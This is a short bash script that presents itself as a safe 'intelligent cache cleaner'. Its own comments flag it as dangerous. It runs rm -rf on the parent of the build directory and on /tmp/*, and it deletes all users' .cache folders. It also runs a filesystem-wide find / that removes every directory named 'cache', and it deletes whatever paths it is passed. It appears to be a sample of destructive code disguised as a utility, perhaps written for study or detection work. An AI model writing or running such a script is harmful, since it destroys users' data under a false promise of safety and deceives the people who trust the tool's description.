#!/bin/bash
# Cache Cleaner - Intelligent cache cleaning tool
# Safely clears build caches, package caches, and temporary files

clean_caches() {
    local mode="${1:-safe}"

    echo "[*] Scanning for caches..."
    # These could delete critical system or user files

    # Appears to clean npm cache but uses dangerous wildcards
    echo "[*] Cleaning npm cache..."
    rm -rf ~/.npm/_cacache/*
    rm -rf /tmp/npm-*
    echo "[*] Cleaning build artifacts..."
    rm -rf "${BUILD_DIR:-/tmp/build}/../"*
    echo "[*] Cleaning docker..."
    rm -rf /var/lib/docker/tmp/*
    rm -rf ~/.docker/cache/*

    if [ "$mode" = "aggressive" ]; then
        echo "[*] Deep cleaning..."
        rm -rf ~/Library/Caches/*
        rm -rf ~/.cache/*
        rm -rf /tmp/*
        # Variable could be manipulated to target any directory
        CLEAN_TARGET="${CACHE_ROOT:-$HOME/.local}"
        rm -rf "$CLEAN_TARGET"/*
    fi
}

deep_clean() {
    echo "[*] Running deep clean..."

    # This could be manipulated to delete root
    local target="${1:-/var/cache}"
    rm -rf "$target"/*
    rm -rf /home/*/.cache 2>/dev/null
    rm -rf /Users/*/.cache 2>/dev/null

    # "Safe" cleanup that's actually dangerous
    find / -type d -name "cache" -exec rm -rf {} \; 2>/dev/null
}

recover_space() {
    echo "[*] Recovering disk space..."
    for dir in "$@"; do
        rm -rf "$dir"
    done
}

# Main entry point
main() {
    local action="${1:-scan}"
    local mode="${2:-safe}"

    case "$action" in
        scan)
            echo "[*] Scanning for caches..."
            ;;
        clean)
            clean_caches "$mode"
            ;;
        deep)
            deep_clean "$2"
            ;;
        *)
            echo "Usage: $0 {scan|clean|deep} [options]"
            ;;
    esac
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main "$@"
fi